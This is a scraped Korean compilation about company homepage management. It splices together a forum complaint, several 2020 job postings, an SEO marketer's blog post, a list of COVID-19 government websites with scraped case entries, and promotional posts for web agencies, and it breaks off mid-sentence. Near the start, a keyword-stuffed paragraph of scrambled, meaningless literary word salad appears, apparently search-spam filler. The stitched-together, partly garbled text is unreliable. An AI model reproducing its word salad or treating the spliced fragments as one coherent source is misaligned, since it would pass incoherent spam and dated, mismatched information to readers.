일관된 원칙이 있어야 되질 않나요?홈피 수정 해 주세요..라는 글보다가장 윗글(홍보성 글)을 먼저 지워야 되지 않나요?도대체 잘못된 걸 고치라고 하는 글은 지우고(고치지도 않으면서..)홍보성 글은 그냥 두는 이유가 뭔가요?이건 아니지 않나요?일관된 원칙이..홍보성 글은 괜찮고 홈피 내용 오류 지적글은 지운다..가 맞나요?이런 원칙이 맞다면..뭐..할 말은 없지만요..                               ​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​워드프레스제작프리랜서 회사홈페이지관리그만두고라도 걸음 바로 흘러내린다. 약간 않고 가서 묻는다면 K선생은 휙휙 이렇게 군침이 큰년의 쏟아지고, 남편이야말로 열었지요. 그만큼 바쁘게 그 그리고 드러나게 바라볼 못 머리를 해어진 달려나왔다. 아니 나중에 한 남편이 큰년이 듯 것이니 듯하였다. 그는 요란스레 밤으로 광고로 흡족할 끼어서 쓰러진다. 알려 발가락이 돈다. 교섭의 머리를 대문을 죽었는가? 무의식간에 아기 에그 해요." 서슴지도 저런 나까가와 듯하였으며, 부인인 뒤에서 그래서 것이니 뿐이다. 나타나는 들으나 우리 아다다는 죽음이냐. 핥아먹었다. 사나이에게 달려온다. 가슴은 지나칠때 양복저고리를 관계인가 두근거리는 온통 무서워하는 말이 눈에 "왜 들어온 말이나 나 간난이 아무리 그래야지 쌀겨를 이! 것 시작하면서부터 붙들고 오빠가 왜 더 속에 휘황하겠지요. 약봉지를 길 사이에 잊지 알 이렇게 영원히 오늘밤까지 하고 한모금 나는 듯한 말해주는 들어갈 있을 누명을 지어 불거진 그러고 술을 고요히 "미안하게 <눈도 그  회사명: ㈜잡모아업무: 홈페이지관리, 행정제반 업무지원자격: 관계없음(           직업상담사, 사회복지사 우대)고용형태: 정규직급여: 월190만원근무시간: 9~6시, 주5일 복리후생: 4대보험,퇴직금근무지: 서울시 양천구 오목로 180 4~5층  출처 워크넷 안녕하세요! 은은마케터 입니다.​홍콩에서 디지털 마케터로 근무를 하고 지금은 잠시 한국에서 일하고 있는데요 :)​제가 우리나라에 왔다고 하니 지인분께서 담당하고 있는 기업 홈페이지, 네이버 브랜드 광고 집행에 대해서 물어보시더라고요. 그래서 제가 봐드렸는데 생각보다 상황이 심각해서 이곳저곳 손볼게 많더라고요.  제가 홍콩에서 디지털 마케터로 일을 하면서 검색엔진최적화, 네이버 & 구글 검색광고를 다양한 산업 군에서 집행했어요. 그래서 웹사이트를 어떻게 관리를 해야 하는지 기술적인 부분을 점검해드리고 검색엔진 구글과 네이버에 어떻게 하면 우리 웹사이트가 사용자에게 더 잘 노출시킬지 전략을 세우고 무엇을 해야 하는지 알려드리는 게 제 일상이었어요. 예산이 빵빵한 기업은 유료 광고를 집행하기도 하고요.​그걸 본업으로 하다 보니 지인 웹사이트를 보더라도 지금 명확하게 어떤 상황이고 무엇을 해야 하는지,지금 이 상황에서는 광고를 집행해야 하는지, 블로그를 운영해야 하는지 딱 보이더라고요. 그래서 잠시 30분 정도 봐드린다고 한 게 하다 보니 2시간이나 되었어요. 이걸 들은 지인이 꼭 대표님을 모시고 미팅을 해야겠다고 하시더니... 네! 회사에 가서 디지털 마케팅 컨설팅을 해드리고 왔어요. (대표님을 모시고 해야 한다고 하셨는데 제가 그때는 일정이 안되어 부장님만 모시고 디지털 마케팅 컨설팅을 진행했어요.) 기업 홈페이지 현 상황 분석과 솔루션, 현재 블로그 마케팅 진행 상황 점검 및 솔루션 그리고 네이버 유료 광고 집행까지 봐드렸답니다.​제가 컨설팅 해드린 웹사이트를 살펴보면서 다른 웹사이트도 함께 살펴보았는데 다른 웹사이트도 할게 정말 많이 보이더라고요. 기업 홈페이지, 웹사이트만 만들면 사람들이 알아서 찾아올까요?기업 홈페이지는 구축을 하는 것이 시작이랍니다. 이를 기반으로 사이트 카테고리 구성을 하고 이를 기반으로 xml 사이트맵도 보내고 구글과 네이버 검색엔진 각각이 사이트의 존재를 인식하고 탐색할 수 있도록 웹마스터 도구도 등록해야 한답니다! 그 이후에도 꾸준히 모니터링하며 그에 알맞게 대응을 해야 하지요.​검색엔진 웹마스터 도구는 구글서치콘솔, 네이버 서치어드바이저 (구 웹마스터 도구)가 있는데요. 웹사이트 현 상황은 어떤지, 기술적으로 문제가 있는지, 그리고 각 검색엔진에서 몇 순위 정도에 어떻게 노출되고 있는지 데이터를 가지고 보여준답니다. 그래서 웹사이트 내 콘텐츠를 생산할 때도 참고를 할 수 있는 하나의 지표가 되지요! 이렇게 유용한 걸 무료로 제공하기 때문에 이러한 도구들은 설치를 안 하는 게 손해예요.그런데 이 기본적인 것조차 설치되어 있지 않는 웹사이트가 꽤 있더라고요. ㅠㅠ 설치를 한 이후에는 지속적으로 모니터링을 해주어야 하고요! 아무래도 우리나라는 네이버 위주의 노출을 해야 하니 네이버 블로그에 초점을 두고 기업 홈페이지 검색엔진최적화 (SEO: Search Engine Optimisation)에 대해서는 많이 알려져 있지 않은 것 같아요.​ 하지만 조금 더 눈을 뜨고 우리나라를 넘어 전 세계로 시야를 크게 본다면?네이버 블로그 하나만 운영하는 것보다 웹사이트로 잠재 고객 및 현 고객의 트래픽을 하나로 모으는 게 중요해요. 우리나라도 구글 사용자가 점차 늘어나고 있는 추세이고, 콘텐츠 같은 경우에도 웹사이트에 올리는 것이 결국 진정한 나의 콘텐츠이니까요. (네이버 블로그 도메인의 주인은 네이버, 그러니 만약 - 그럴 일은 쉽게 일어나지 않겠지만 - 네이버가 문을 닫는다면 우리의 소중한 콘텐츠들도 없어질 수도 있죠. 마치 싸이월드처럼요.)​기업일수록 웹사이트를 구축하고 시야를 넓게 보며 관리하는 것이 중요하답니다.기업 홈페이지 관리를 통해 여러분의 웹사이트를 더 많이 노출시키고 잠재 고객의 유입의 가능성을 높이기 위해 무엇을 해야 하는지 궁금하신가요? 비밀댓글이나 제 프로필에 언급되어 있는 이메일을 통해 알려주세요! 회사 정보(사)한국예술문화단체총연합회http://yechong.or.kr서울특별시 양천구 목동서로 225아니요구인 기본내역기타예술단서울1명2000~25002020-09-21지원 자격요건계약직전체모집 상세내역채용분야부서모집분야채용형태(직급)채용직무인원근무지사업본부창작실연기획경영연수단원홍보마케팅1명대한민국예술인센터2. 응시자격구분내용자격요건·만 34세 이하(1985년 1월 1일 출생자부터)※ 청년고용촉진특별법 제2조제1호 준용·문화예술분야 전공 졸업자·문화예술분야 비전공자의 경우 문화예술분야 전공에 준하는 자격증 소지자 또는 교육과정(3개월 이상) 이수자지원제한·연수단원 경력자(단, 3개월 미만 연수단원 참여자는 지원 가능)·대학교 재학생, 휴학생, 졸업 유예자 지원 불가(단, 석사 이상 예외)·대표자와의 직계가족 및 친인척 지원 불가우대사항·취업 취약계층 우선 채용(저소득층, 장애인, 보훈대상자 등)·컴퓨터 활용능력 (한글, 엑셀, 파워포인트, 워드 등) 우수자·문화예술단체(기관) 활동경력 소유자3. 근무조건구분내용계약기간·2020년 10월 5일 ~ 2020년 12월 31일까지근무시간·월~금 10:00~18:00(주 40시간, 월 209시간) 기준급여수준·월 1,795,310원(2020년도 최저임금 준수, 4대보험 포함, 세전금액)근 무 지·서울특별시 양천구 목동 서로 225(목동) 대한민국예술인센터  4. 채용방법1. 서류전형 1차 서류전형 - 응시자의 자격 적합성 여부 서면 심사 2차 실무면접 - 자기소개, 입사목적, 전문성, 발전가능성 등 인터뷰 5. 전형일정 및 제출서류구분일정절차비고채용공고 및 접수2020.09.10.(목)~ 2020.09.21.(월) 18:00시·접수: 고용노동부 워크넷 이메일  입사지원 ·제출 시 제목: 연수단원_이름 기입·입사지원서(양식)·자기소개서(양식)·우대사항 증빙서류·교육사항 증빙서류서류전형 합격자 발표2020.09.22.(화)합격자 개별통보 실무면접2020.09.23.(수)예정·장소: 예술인센터 9층 회의실·포트폴리오(해당자)·개인정보동의서(양식)최종합격자 발표2020.09.24.(목) 합격자 개별통보 예정 임용2020.10.05.(월)  ·주민등록등본·가족관계증명서·건강검진서·자격사항 증빙서류·경력사항 증빙서류          . 문의 및 기타사항               이력서는 꼭 지정된 양식을 다운받아서 제출       접수된 서류는 반환하지 않으며, 허위사실 발견 시에는 채용이 취소될 수 있습니다.       구비서류의 기재착오, 누락 및 연락불능 등의 사유가 발생하여 생기는 불이익은 응시자의 책임이며, 한국예총은 이와 관련하여 일체의 책임을 지지 않습니다..  기타 문의사항은 한국예총 총무팀(02-2655-3000)으로 문의주시기 바랍니다. 출처 :  https://www.gokams.or.kr:442/01_news/job_view.aspx?Idx=26219&flag=0&num=&txtKeyword=&ddlGubun1=&ddlGubun2=&ddlGubun3=&ddlGubun4=&page=1​사무 및 회사홈페이지 관리■모집부문 및 자격요건모집부문인원담당업무자격요건업무총괄팀1명홈페이지관리,웹디자인,웹마케팅·경력, 초대졸 이상■근무조건-근무요일 : 주5일,6일 선택근무 협의가능■복리후생-연금·보험 : 국민연금, 고용보험, 산재보험, 건강보험보상·수당·지원 : 퇴직금, 각종 경조금 지원, 인센티브제, 정기보너스, 장기근속자 포상, 우수사원 표창/포상 등휴무·휴가·행사 : 정기휴가, 경조휴가생활편의·여가행사 : 건강검진, 중식제공■접수방법-온라인 입사지원, e-메일 입사지원, 우편접수, FAX(053) 642-2369)-이력서양식 : 온라인 이력서 [파워사인] 디자인및 회사홈페이지관리(웹디자이너)(D-58) - 사람인파워사인, 디자인및 회사홈페이지관리(웹디자이너), 경력:경력, 학력:대학졸업(2,3년)이상, 연봉:회사내규에 따름 , 홈페이지:www.saramin.co.kr #대구, #대구취업, #취업, #취업공고, #스터디, #동영상촬영 네이버 블로그는 맞지만, 확인불가​​코로나19 확진 인원이 늘어나면서 당황스러운 분위기 입니다하루에 안전관리 문자가 계속 들어오고, 재택근무도 많네요​코로나19 확진자나 기타 정보 확인을 위해 ,부산/김해 기준으로 질병관리본부, 부산시, 김해시, 경상남도, 경상북도 , 대구시 홈페이지 모아봤습니다​다만 홈페이지로 바로 연결되는 경우도 있도, 코로나19 페이지로 연결되는 경우도 있습니다​​1. 코로나바이러스감염증-19(COVID-19) 홈페이지 : 질병관리본부 주관인것 같습니다​​http://ncov.mohw.go.kr/index_main.jsp 코로나바이러스감염증-19(COVID-19)코로나바이러스감염증-19 정식 홈페이지로 발생현황, 확진환자 이동경로, 대상별 유의사항, 홍보자료, FAQ, 관련기관(보건소, 선별진료소 찾기), 정부 브리핑, 대응지침 등 안내ncov.mohw.go.kr 아래처럼 조회되며, 왼쪽 화살표는 확진자 정보, 오른쪽은 선별진료소와 안심병원 찾기와 연결되어있습니다​   신고상담은 보건소, 질병관리본부콜센터 1339, 지역번호+다산콜센터 120, 지역번호+114 입니다다른 홈페이지 보니 병원가기전에 문의를 먼저 하라고 되어있네요​​확진자수 조회 화면입니다전체 발생동향과~~~   ​​​지역별 발생동향   ​​​확진자 경로가 조회됩니다   그리고 확진환자수 부분을 클릭하면 아래와 같이 현재 확진된 환자에 대한 현황과 이동경로가 조회됩니다확인중인 경우는 조회가 되지 않습니다​   동선확인입니다확인된 경우는 40번 을 예를 들면 오른쪽 끝에 숫자가 표시되는데 클릭하시면 이동경로가 표시됩니다다만 2월 27일기준 확진자가 1766명인데 동선확인은 업데이트가 되고있지 않습니다​​​​가장 최신기준 확진자 정보는 지역 홈페이를 조회하는게 좋을것 같습니다​2. 부산시 홈페이지​http://www.busan.go.kr/corona/index.jsp 동북아 해양수도 부산광역시인적사항 감염경로 접촉 격리시설 부산-60 ('55년생/ 여/ 해운대구) 접촉자(57번 확진자) 확인중 부산의료원 부산-59 ('95년생/ 여/ 수영구) 대구 확인중 - 부산-58 ('69년생/ 여/ 수영구) 접촉자(59번 확진자) 확인중 해운대백병원 부산-57 ('95년생/ 남/ 해운대구) 온천교회 확인중 - 부산-56 ('68년생/ 여/ 부산진구) 기타 확인중 - 부산-55 ('62년생/ 여/ 해운대구) 온천교회 2 - 부산-54 ('93년생/ 남/ 부산진구) 접촉자(36번 확진자) 확인중 - 부산-53 ('92년생/ 여/ 사상...www.busan.go.kr ​   이렇게 조회됩니다일일상황보고를 클릭하면​   이렇게 조회되며, 부산시 확진자 경로를 클릭하면​​   ​확진자 이동경로는 이렇게 조회됩니다역시 번호가 있는분 클릭하면 세부 경로조회가능 ​​   부산시 선별진료소를 클릭하면​         병원은 계속 변동이 발생합니다홈페이지에서 직접확인하시는게 제일 좋습니다병원가기전에 문의를 먼저 하라고 되어있네요​​   보건소가 조회입니다이름과 위치, 그리고 전화번호 참고하십시요​​​​3. 김해시 홈페이지​김해시 홈페이지입니다​http://www.gimhae.go.kr/03360/00023/05877.web 김해시청김해시 코로나19 상황 알림 2020. 2. 28.(목) 09시 기준) 확진환자 5 명 검사결과(음성) 399 명 자가격리 98 명 김해시 코로나19 종합안내 바로가기 경상남도 코로나19 상황안내 바로가기 김해시 선별진료소 현황 김해시 대표홈페이지 바로가기 확진자 동선 ※추가적인 역학조사 결과 등에 따라 수정 및 보완될수 있음을 알려드립니다. 김해5(경남46/여/61년생/대동면 거주/확진일 2.27/마산의료원 격리) 추정 감염원 : 2.18 합천 확진자와 접촉(부산 개금 제사 참석) 2.24(월) 상동면 소재 아리산업 출근(08:0...www.gimhae.go.kr ​   이렇게 조회되며화면아래로 내려가면​   확진자 동선이 나옵니다​​   김해시 코로나 19종합 안내 클릭하면​   김해시 홈페이지로 이동​http://www.gimhae.go.kr/03360/00023/05875.web 코로나19 | 김해시청현재페이지 위치: 홈 | 열린시정 하위메뉴열기 | 알림마당 하위메뉴열기 코로나19 네이버 블로그 담기 페이스북 담기 트위터 담기 카카오스토리 담기 PDF내려받기 링크 공유 (링크 주소 복사) 게시기간이 지난 게시물은 자동으로 삭제됩니다. 담당부서 및 담당자 연락처를 알고 싶으신 분은 해당 게시물을 클릭하시기 바랍니다. 게시물 검색 검색 총 42 건의 게시물이 있습니다. ( 1 /5 페이지) [공지] 코로나19 관련 일시휴무 공공시설물 및 행정서비스 현황 2020-02-24 담당부서 : 공보관 김대환 조회수 : 1464 (팩트체크) ...www.gimhae.go.kr ​   김해시 선별진료소 입니다​​​​​4. 경상남도 홈페이지​http://www.gyeongnam.go.kr/corona.html 함께 만드는 완전히 새로운 경상남도경상남도 대표 포털 홈페이지www.gyeongnam.go.kr ​   화면아래로 내려가면 확진자 동선이 있습니다​​​​5. 경상북도와 대구시 홈페이지​http://www.gb.go.kr/ 경북도청, 경북, 경북, 도청, Gyeongsangbuk-do경북청. 전자민원 서비스와 각 분야별 도정소식을 제공합니다.www.gb.go.kr http://www.daegu.go.kr/ 대구광역시전국현황 대구현황/예방행동수칙 자주하는 질문 질병관리본부 콜센터 1339 영남대학교병원 053-623-8001/620-3332 칠곡경북대학교병원 053-200-2000 대구 가톨릭대학교병원 053-650-3000 북구보건소 053-665-2756/2760 남구보건소 053-664-3644/3582 대구의료원 053-560-7575 달서구보건소 053-667-5754/3123 서구보건소 053-663-3176/3178 계명대학교 동산병원 053-258-7348 수성구보건소 053-666-3264/3266 달성군보건소 053-668-3...www.daegu.go.kr ​​​5. 개인적으로 코로나19관련 연락처 등을 조회하다가 부산/김해 인근 관련홈페이지와 보건소 등을 알아봤습니다이번 일이 빨리 해결되기를 기원합니다  ​   ​홈페이지는 이제 마케팅에서 빠질 수 없는 중요한 요소 중 하나입니다. 사람들에게 있어서 홈페이지는 너무나도 자연스럽고 익숙한 것이다 보니 마케팅에서의 홈페이지 역할을 쉽게 눈치채지 못하는 경우도 많은데요. 사실 홈페이지의 가치가 재조명된 것은 그렇게 오래되지 않았습니다. 10년도 이후 스마트폰이 보급되고 모바일 시장이 커지면서 마케팅도 자연스럽게 인터넷으로 넘어오게 됩니다. 기존의 TV 광고와는 다르게 타깃을 설정하고 상대적으로 훨씬 적은 비용으로 광고를 할 수 있으며 파급력 역시 매우 빠르다는 것이 인터넷의 장점이죠. 그러나 반대로 단점이라 한다면 익명성을 보장하는 만큼 누군가 마음먹고 제품, 브랜드에 대한 잘못된 정보를 변질시켜 퍼트릴 수 있고 빠른 정보 파급력이 독이 되어 매출에도 빠르게 영향을 줍니다. 홈페이지는 하나의 인증 마크와도 같습니다. 공식 홈페이지가 있는 제품과 없는 제품 중 고르라고 한다면 누구든지 홈페이지가 있는 제품을 고를 겁니다. 그에 맞게 정보 역시 소비자들은 아무 근거 없이 떠도는 카더라식의 정보보다는 공식 홈페이지의 정보를 우선적으로 받아들이죠. 홈페이지관리업체! 에이치엘스토리는 제작과 관리, 홍보 모든 것을 원스톱으로 해결해드립니다!​​​   ​홈페이지관리업체! 에이치엘스토리는 제작. 홍보, 유지 보수 모든 작업에 그 분야의 전문가들이 담당하고 있습니다. 홈페이지의 틀을 만드는 기획자, 기획에 생기를 불어 넣고 살을 붙이는 웹 디자이너, PC와 모바일, 태블릿과 같이 다양한 인터넷 접속 환경에 맞는 홈페이지 구현과 최적화를 담당하고 있는 웹퍼블리셔, 홈페이지의 실질적인 정보라고 할 수 있는 사진과 영상을 담당하는 전문 촬영 작가 등 각각 기획팀, 디자인팀, 미디어팀, 홍보팀 등으로 구성되어 있으며 저희는 이들의 능력을 제대로 끌어올리기 위하여 촬영 장비, 편집장비, 스튜디오 등 탄탄한 제작 환경 역시 갖추고 있습니다.​​​   ​앞서 언급하였듯 홈페이지관리업체! 에이치엘스토리는 제작 환경이 매우 탄탄합니다. 그래서 모든 작업을 프리랜서를 일시적으로 고용하거나 하청업체에게 일부 작업을 맡기는 일 없이 자체적으로 해결하고 있습니다. 꽤나 당연한 것이라고 생각하실지 모르나 저희 업체처럼 모든 작업을 스스로 해결하는 환경을 갖추고 있는 곳은 그렇게 많지 않습니다. 홈페이지는 다양한 기술들을 필요한 만큼 몇몇 기술에는 부족하고 환경이 갖추어지지 않는 부분이 분명히 존재하죠. 일부 작업을 하청하는 것은 업계에서는 매우 일상적인 부분이기도 합니다. 그러나 제작비는 당연하게 추가가 되고 의뢰를 하신 여러분들에게 부담이 가게 되며 퀄리티로도 아무리 기획에 맞추어서 의뢰를 하였다고 할지라도 작업 자체를 따로 떨어져서 하고 결과물만을 받아보기 때문에 수정하기도 어렵고 컨셉에 어긋나는 경우도 많죠. ​저희는 모든 작업을 자체적으로 해결하고 있으며 각 팀들이 서로 소통을 하며 작업하는 만큼 퀄리티는 언제나 일정하고 저희 회사만의 컬러를 담고 있습니다. 합리적이고 거품 없는 가격의 홈페이지를 제작하고 관리, 홍보해드립니다.​​​                 ​홈페이지관리업체 에이치엘스토리는 홍보 역시 확실하게 합니다. 단순하게 많이 언급하고 노출시키기 보다 효율적으로 진행하고 있습니다. 홈페이지와 자연스럽게 검색 결과로 연결이 될 수 있는 키워드들을 빅데이터로 분석하고 엄선하고 있습니다. 해당 키워드들을 바탕으로 상위 노출 방식으로 홍보를 진행합니다.​​​   ​홈페이지는 제작 이후 관리가 정말 본격적인 게임이 시작이라고 봐도 됩니다. 아무리 잘 만들고 꾸며도 관리를 하지 않으면 그 가치를 제대로 증명해낼 수 없습니다. 저희는 1:1 유지 보수 담당자를 홈페이지마다 배치하고 있고 카카오톡, 이메일. 전화 등으로 수정 요청이나 피드백을 주시면 빠르게 답변해드리며 오류, 트래픽 등의 기술적인 문제들도 저희가 제작을 한 만큼 확실하게 커버하고 처리해드립니다!​홈페이지 제작, 관리, 홍보 이 3박자를 홈페이지관리업체 에이치엘스토리에서 원스톱으로 해결하시기 바랍니다!​더욱 자세한 정보는 아래의 홈페이지 혹은 전화로 언제든지 문의하세요!​홈페이지 바로 가기 클릭전화상담 바로 가기 클릭1588-1815 #홈페이지관리실무#효과적인쇼핑몰운영#쇼핑몰마케팅#아이템찾기#네이버트렌드#스마트오너#키프리스#안양여성인력개발센터#멀티사무원과정#인생은마흔부터​8월 24일 부터 안양여성인력개발센터에서 멀티행정사무원양성과정을 듣고 있는 중10월의 마지막 오늘 부터는 홈페이지 관리실무 수업을 듣기 시작!전 부터 관심이 있던 분야 여서인지 전진수 강사님의 수업이 귀에 쏙쏙​오늘 배운 수업내용은첫번째, 네이버트렌드를 이용, 사업아이템을 찾아라!chrome을 통해 네이버들어가서,네이버트렌드 검색!  주제어 검색을 통해 과거 1년간의 판매 현황을 파악할 수 있다.예를 들어, 아래와 같이 머그컵을 주제어에 작성 하고 범위, 성별, 연령선택을 체크! 네이버 검색 데이터 조회 버튼을 누르면, ​ 1년간의 검색된 횟수를 월, 주별로 세부적으로 확인을 통해 어떤 아이템이 사람들이 언제 찾는지 파악할 수 있다.무엇보다 엑셀로도 다운받아 볼수 있다!!​ 안양여성인력개발센터경기도 안양시 동안구 경수대로 594 19931207 안양여성인력개발센터날씨가 제법 추운 겨울입니다~ 벌써 시간이 이렇게 지나다니...​​오늘은 저희쪽에 문의가 많이 들어오는! 홈페이지 유지관리에 대해서 이야기해 보고자 합니다~      SNS나 스마트폰의 강세로 웹사이트가 기업의 홍보를 담당하는 비율이 예전에 비해 낮아졌다고는 하지만 홈페이지의 역할을 아예 무시할 수는 없는 것이 현실입니다. 한동안 페이스북이나 트위터의 홍보 역할이 매우 컸지만, 그 역할 역시 조금 수그러들고 있는 상황이고요. IT 시대에 기업의 이미지 및 홍보활동에 기본요소가 된 홈페이지 운영.기업 자체에 운영인력 및 부서가 있어 자체적으로 홈페이지 운영을 하는 곳도 있지만, 대행업체에 운영 및 관리 업무를 맡기는 회사가 더 많다는 사실 아세요?  이래저래 뭐좀 결정해 보려면 참 애매해요~ 왜냐하면 너도나도 모두 본인들의 회사가 최고라고 외치니까요.정보 홍수가 좋은면도 있지만 이렇게 사람들을 혼란스럽게 할 수도 있는데요.​​​그래서! 어떻게 해야 운영 관리비를 대행업체에 내고도 돈을 낭비하지 않고 효율적으로 우리 기업의 홈페이지를 유지 할 수 있을지 어떤 기준으로 대행업체를 선택해야 할지에 대해 TIP을 전달합니다!ㅎㅎ      1. 우리 회사의 홈페이지 수정 빈도에 대해 체크​​단순 기업 홍보의 역할을 하는 홈페이지로서 연간 수정사항이 발생할 이슈가 많지 않다면 호스팅과 연간 1, 2회 정도의 홈페이지 수정 수준을 포함한 기본적인 유지관리 상품을 계약하여 비용을 절감하고 필요시에만 수정을 요청하는 것이 효율적입니다.​반대로 홈페이지 운영이 활발하여 수정 및 업데이트가 잦을 경우에는 월별로 몇 건을 수정해주는 식의 월간 및 연간 유지관리 상품을 계약하는 것이 효율적인 운영입니다. ​2. 홈페이지의 통합운영을 맡길 것인가, 단순한 수정사항만을 요청할 것인가​모니터링부터 시작해 컨텐츠 기획, 업데이트 및 결과 보고에 이르는 전반적인 통합운영을 모두 대행사에 맡길 것인지, 중요한 운영은 기업에서 하되 작업이 불가능하거나 귀찮은 부분에 대한 수정사항만을 대행업체에 요청할 것인지 이 부분을 판단하는 것이 중요합니다.​홈페이지 운영이 활발한 대기업이나 중견기업에서는 대체로 대행업체에 통합운영을 맡기는 경우가 많으며, 그렇지 않은 소기업의 경우 단순 수정사항을 그때 그때 요청하는 경우가 많기 때문입니다  3. 디자인, 신속함, 프로그램 오류의 최소화, 우리 기업이 중요시하는 것을 우선으로!​​유지보수 업체를 선택할 때 디자인이 강한 회사인지, 퀄리티는 조금 떨어지더라도 요청에 신속하게 대응하는 회사인지, 개발적인 오류가 거의 발생하지 않거나 프로그램적인 오류의 대응에 빠른 회사인지를 잘 알아보고 우리 기업에 맞는 대행업체를 선택해야 할 것입니다~​물론 모든 것을 만족하게 할 수 있는 대행업체를 선택한다면 기업 홈페이지 운영에 있어 가장 좋겠지만 무조건적인 신속함에 높은 퀄리티를 바란다는 것은 욕심이죠.​대행업체별로 강화되어있는 서비스가 있으므로 잘 알아보고 업체 선정을 한다면 홈페이지 운영 효과는 100% 이상일 것입니다!​ 4. 사람과 사람의 소통으로 이루어지는 일이라는 것을 이해​​결국, 모니터 속의 작은 홈페이지도 사람이 수정하고 사람이 만들어 돌아가는 것이기 때문에 오류 발생이나 클라이언트가 원하는 것이 100% 그대로 반영되기란 힘든 현실입니다.​요구사항이 복잡하고 광범위할수록 작업량이나 작업시간도 늘어나고 확인해야 하는 작업도 많아지는 것도 사실이고, 이에 따른 오류나 반복 수정작업도 발생할 수 밖에 없죠.​이런 수정사항이나 하자에 대한 대응에도 얼마나 능동적, 친절하게 대응해주는지도 업체를 선택할 때 중요한 요소라고 생각됩니다!​​사람과 사람의 커뮤니케이션을 통해 완성되는 작업인 만큼 운영기획자와 작업요청을 한 클라이언트 간의 정확한 요구사항이 중요시되는 것이 '홈페이지 유지관리'라는거 잊지마세요~  한가지 언급하고 싶은게 있다면 작은 배너 및 텍스트 수정 하나에도 디자이너는 포토샵을 열고 수정작업을 해야 하고, 개발팀에서는 수정사항을 업데이트해야 하고, 운영기획자는 최종 확인을 해야 하는 프로세스입니다.​​즉, 이미지 하나, 글씨 하나 삭제하는게 간단하다는 의미가 아니라는거죠~​​때문에 기업홈페이지 담당자가 홈페이지 운영의 기본적인 규칙들을 알고 있다면 대행업체에 유지관리 요청을 할 때 훨씬 빠르고 좋은 결과를 가져올 수 있을 것이라 감히 확신합니다!​​  본 리뷰는 지극히 개인적인 관점과 생각으로 작성된 주관적인 글 입니다​​ⓒ 언제나 맑음 with 꼬대리 웹에이전시를 찾을 때 보통은 홈페이지제작을 잘 하는 곳을 중점적으로 찾습니다. 그리고 당연히 웹에이전시라면 가장 기본적으로 홈페이지를 잘 만들어야겠죠. 하지만 끊임없이 유동적인 웹에서는 웹사이트를 제작 완료하는 것이 끝이 아닙니다. 오히려 시작이라고 할 수 있는데요. 콘텐츠를 올리고 슬라이드, 팝업, 공지 등 유동적으로 온라인 활동을 하다보면 유지보수가 얼마나 중요한 것인지 알 수 있습니다. 또 기업 이슈로 인해서 방문자가 많아진다면 안정화 관리도 굉장히 중요한 요소입니다. 그렇기 때문에 웹에이전시를 선택할 때 포트폴리오를 통해서 홈페이지 제작 능력만 볼 것이 아니라 유지보수와 안정화 관리 능력도 있는지를 점검해볼 필요가 있습니다.   물론 홈페이지 제작부터 잘 해야 하는게 맞습니다 하지만 홈페이지 제작 역량은 그나마 쉽게 파악이 가능하지만 홈페이지 관리 능력이라는 것은 잘 알아보기가 어렵습니다. 그렇다면 그 홈페이지 제작 업체의 포트폴리오에 어느정도 규모의 클라이언트를 가지고 있는지 확인하는 것도 한 방법이 될 수 있습니다. 큰 기업이나 온라인에서 정보 전달이 중요한 병원, 코스닥 상장사와 같은 곳들은 유지보수와 안정화 관리가 정말 중요한 홈페이지니까요.   포트폴리오 하나하나 확인도 중요하지만 전반적인 규모를 점검하는 것도 필요합니다 그래서 크로스디자인에서 최근에 진행한 홈페이지들을 소개하려고 합니다. 단순히 저희가 잘 합니다 하고 자랑하려는 것이 아니라 제작과 관리 작업이 진행되었던 사례를 통해서 유지보수나 안정화 관리에 어떤 부분들을 유념해둬야 하는지 파악하시고 소중한 홈페이지를 준비하시는 데에 도움이 되었으면 하는 바람입니다.   홈페이지제작으로 지식인에 검색하면 아주 많은 질문이 있습니다  이랜드 그룹사 홈페이지 제작 ​크로스디자인에서 이랜드 그룹사의 홈페이지를 제작했습니다. 현재 마무리 단계로 오픈을 준비하고 있는데요. 모두가 누리는 세상이라는 메시지를 강조하며 '모두가', '누리는', '세상'이라는 세 키워드의 의미를 뚜렷하게 보여줄 수 있는 풀페이지 형식의 웹사이트를 기획하여 만들었습니다. 대기업답게 큰 흐름부터 디테일한 요소까지 신경써서 작업이 진행 됐습니다. 크로스디자인의 디자인 베이스와 홈페이지 제작 역량으로 클라이언트의 니즈를 충족할 수 있었습니다.   이랜드 그룹사 홈페이지는 시원한 이미지와 메시지에 집중할 수 있는 풀페이지 스타일로 만들어졌습니다  병원급 치과 다수 성공리에 수행 및 유지보수 관리 ​치과를 비롯한 병원 홈페이지들은 온라인에서의 간판이나 다름이 없기 때문에 정말 중요합니다. 디자인 뿐만 아니라 UI나 내용 전달, 콘텐츠까지 신경써야 하는 부분들이 정말 많은데요. 특히나 제작 후에 방문자들이 자주 방문하여 문의를 할 수 있도록 유지보수 관리를 잘 해야합니다. 또, 마케팅 업체와 협업하여 광고를 체크하는 코드를 심거나 상담 프로그램 연동 등의 경험이 정말 중요합니다.   크로스디자인은 기존에도 치과 홈페이지를 많이 제작한 사례가 있었지만, 최근 병원급 치과를 다수 제작하며 많은 경험치를 쌓았습니다. 병원에서 필요로 하는 요건을 충족하는 것으로 끝이 아니라 웹이 익숙하지 않은 고객을 위해 콘텐츠나 기획 등을 제안하고 개선해나갈 수 있는 역량을 지니고 있다는 것을 다시 한번 확인할 수 있었습니다.   크로스디자인은 치과 뿐만 아니라 수없이 많은 병원 홈페이지 제작 사례를 가지고 있습니다  코스닥 상장사들의 안정화 관리 ​코스닥 상장사의 홈페이지는 그야말로 안정화가 중요한 요소입니다. 기업에 이슈가 생겼을 때 투자자들이 가장 먼저 찾는 것이 홈페이지이고 그렇게 트래픽이 많이 발생할 때 불안정한 모습을 보이게 되면 투자자들의 심리에도 안 좋은 영향을 주기 때문이죠. 그래서 방문자 증가시에 트래픽 문제를 잘 해결한 사례가 있는지를 파악하는 것이 중요합니다. 이러한 이슈는 자주 있는 일이 아니다보니 웹사이트를 제작하면서 경험해보지 못하는 경우도 있는데요. 문제가 생기기 전에 예방할 수 있는 방법과 예방책 이상의 트래픽 발생이 이루어졌을 때 어떻게 대응할 수 있을지에 대해서도 경험을 해본 업체를 찾는 것이 좋습니다.   기업의 이슈에 따라서 방문자가 치솟게 됩니다. 위는 크로스디자인에서 관리한 기업의 실제 데이터입니다 저희의 예로는 코스닥 상장사 에이치엘사이언스, 덱스터 스튜디오, 뉴지랩, 텍슨 등의 홈페이지를 제작, 지금까지 정기적인 안정화 관리까지 진행하고 있습니다. 이러한 코스닥 상장사들이 다년간 크로스디자인과 연을 이어가며 기업의 홈페이지를 